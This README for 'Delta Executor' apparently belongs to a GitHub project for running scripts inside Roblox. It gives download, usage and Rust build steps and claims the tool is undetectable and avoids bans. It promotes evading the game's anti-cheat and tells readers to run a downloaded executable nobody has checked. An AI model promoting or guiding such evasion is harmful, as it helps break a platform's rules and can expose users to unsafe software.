# Delta Executor
Delta Executor is a tool designed to execute scripts in Roblox. It is built to be undetectable and aims to prevent bans while using the application.

## Download
1. Go to the [releases tab](https://github.com/konyanayim0x/delta-execute/releases).
2. Find the latest release.
3. Download the file named `delta-execute.zip`.
4. Extract the contents of the zip file to a folder on your computer.

## Usage
1. Open the folder where you extracted the files.
2. Double-click on `delta-execute.exe` to run the application.
3. Once the GUI opens, you can input your script.
4. Click the execute button to run your script in Roblox.

## Build from Source
1. Clone the repository using `git clone https://github.com/konyanayim0x/delta-execute.git`.
2. Navigate to the project directory.
3. Ensure you have Rust installed on your system.
4. Run the command `cargo build --release` to build the project.
5. Find the executable in the `target/release` folder.
